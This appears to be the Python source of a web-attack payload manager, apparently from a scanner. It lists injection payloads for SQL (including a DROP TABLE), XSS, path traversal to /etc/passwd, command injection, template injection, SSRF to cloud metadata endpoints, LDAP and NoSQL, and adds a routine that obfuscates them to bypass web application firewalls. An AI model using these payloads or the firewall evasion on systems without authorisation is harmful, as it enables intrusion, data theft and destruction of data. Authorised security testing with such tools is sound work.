import random
import urllib.parse

class PayloadManager:
    def __init__(self, waf_type=None):
        self.waf_type = waf_type
        self.payloads = self._load_payloads()

    def _load_payloads(self):
        return {
            'sqli': [
                "' OR '1'='1",
                "admin'--",
                "1' AND '1'='1",
                "1' AND '1'='2",
                "' UNION SELECT NULL--",
                "' UNION SELECT 1,2,3--",
                "'; DROP TABLE users--",
                "' AND SLEEP(5)--",
                "' AND BENCHMARK(5000000,MD5('test'))--",
                "' OR 1=1--",
                "1' ORDER BY 1--",
                "1' GROUP BY 1--",
                "' UNION ALL SELECT NULL--",
                "' UNION SELECT 1,@@version,3--",
            ],
            'xss': [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert(1)",
                "\"><script>alert(1)</script>",
                "'><script>alert(1)</script>",
                "<svg/onload=alert(1)>",
                "<body onload=alert(1)>",
                "<input onfocus=alert(1) autofocus>",
                "<details open ontoggle=alert(1)>",
                "<iframe srcdoc='<script>alert(1)</script>'>",
                "';alert(1);//",
                "\";alert(1);//",
                "{{alert(1)}}",
                "${alert(1)}",
            ],
            'path_traversal': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\win.ini",
                "....//....//....//etc/passwd",
                "%2e%2e%2fetc%2fpasswd",
                "%252e%252e%252fetc%252fpasswd",
                "..;/..;/etc/passwd",
                "..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
            ],
            'cmd_injection': [
                "; ls -la",
                "| whoami",
                "`id`",
                "$(id)",
                "& ping -c 10 127.0.0.1 &",
                "| echo vulnerable",
                "; sleep 5",
                "| sleep 5",
                "& sleep 5 &",
                "$(sleep 5)",
            ],
            'ssti': [
                "{{7*7}}",
                "${7*7}",
                "{{7*'7'}}",
                "<%= 7*7 %>",
                "{{config}}",
                "{{self.__class__.__mro__}}",
                "${7*7}",
                "#{7*7}",
            ],
            'ssrf': [
                "http://169.254.169.254/latest/meta-data/",
                "http://127.0.0.1:8080/admin",
                "gopher://localhost:8080/_",
                "http://[::1]:80/",
                "http://0.0.0.0:80/",
                "file:///etc/passwd",
                "dict://localhost:11211/",
            ],
            'ldapi': [
                "*)(uid=*",
                "admin*)((|userPassword=*)",
                "*)(|(uid=*",
            ],
            'nosqli': [
                '{"$ne": null}',
                '{"$gt": ""}',
                '{"$regex": ".*"}',
                'username[$ne]=toto&password[$ne]=toto',
            ],
        }

    def get_payloads(self, vuln_type, context=None):
        base = self.payloads.get(vuln_type, [])
        if not base:
            return []
        if self.waf_type:
            return self._apply_bypass(base, vuln_type)
        return base

    def _apply_bypass(self, payloads, vuln_type):
        bypassed = []
        for p in payloads:
            # Random case
            if random.choice([True, False]):
                p = ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in p)
            # Comment injection for SQLi
            if vuln_type == 'sqli' and ' ' in p:
                p = p.replace(' ', '/**/')
                if 'OR' in p.upper():
                    p = p.replace('OR', 'O/**/R')
            # URL encode for path traversal
            if vuln_type == 'path_traversal' and random.choice([True, False]):
                p = urllib.parse.quote(p)
            # Add random comments
            if vuln_type == 'xss' and '<' in p:
                p = p.replace('<', '<!---->')
            bypassed.append(p)
        return bypassed
